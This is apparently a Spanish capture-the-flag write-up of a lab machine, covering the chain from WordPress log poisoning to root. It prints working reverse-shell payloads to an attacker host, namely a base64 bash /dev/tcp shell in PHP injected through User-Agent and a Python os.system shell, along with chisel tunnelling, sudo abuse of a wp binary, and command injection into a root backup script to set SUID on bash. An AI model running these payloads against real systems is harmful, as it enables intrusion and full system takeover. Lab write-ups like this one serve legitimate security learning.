
---
- Tags: #writeup #enum #logpoisoning #rce #portforward #python #privesc  
----


- Puerto 80 http
- Se tiene un wordpress, no vulnearble
- Enumerando archivos, en el **/wp-content**, se tiene un **/debug.log**, el cual registra intentos de login en el **/wp-login**
- Simplemente se inyecta un codigo php en el **User-Agent**:

```php
<?php echo `printf YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQ0NDQgMD4mMQo= | base64 -d | bash`; ?>
//RevShell codificada en Base64:
bash -i >& /dev/tcp/<IpAtacante>/443 0>&1
```

- Recibimos una consola interactiva con el user **www-data**
- Despues de probar vectores de escalacion (sudoers, capabilities, suid perms, etc), sin exito.
- Vemos que servicios/puertos internos estan corriendo 

```bash
netstat -tuln
```

- Se tiene corriendo un servicio en el puerto 5000, al parecer una app en Flask
- Teniendo en cuenta que tenemos un directorio **/app**
- Descargamos [[Chisel]] para traernos el servicio interno a nuestra maquina atacante 

```bash
//En nuestra Maquina Atacante
chisel server -p 1234 --reverse 
```

```bash
//Maquina Victima con puerto interno
./chisel client 172.17.0.1:1234 R:9000:127.0.0.1:5000 
```

- Con esto podriamos acceder de forma local a http://127.0.0.1:9000/ 
- Vemos un servicio flask sin mas, fuzzeando encontramos un **/console**, una consola en python
- Simplemente nos ponemos en escucha y mandamos una Shell

```python
import os
os.system('bash -c "bash -i >& /dev/tcp/<IpAtacante>/443 0>&1"')
```

- Recibimos una shell como el usuario **app**, el cual puede ejecutar el siguiente binario:
```bash
    (wpuser) NOPASSWD: /usr/local/bin/wp
```

- Con este binario podemos aprovecharlo para ejecutar comandos con el uso de "**sudo -u wpuser /usr/local/bin/wp --exec**", como el usuario **wpuser**
- Crearemos un archivo /tmp/shell, con su respectiva ReverseShell, nos ponemos en escucha nuevamente y mandamos el siguiente comando
```bash
sudo -u wpuser /usr/local/bin/wp --exec="system('bash -c /tmp/shell');"
```

- Recibimos una Shell como el usuario **wpuser**
- Este usuario puede ejecutar:
```
sudo -l

User wpuser may run the following commands on 1d1e943f10a8:
    (root) NOPASSWD: /opt/scripts/backup.sh
```

- Vemos que podemos ejecutar comandos en el sistema exitosamente **sudo /opt/scripts/backup.sh; whoami**
- sudo -u root /opt/scripts/backup.sh "../../../tmp/adada ; chmod u+s /bin/bash;" 
- y pa dentro!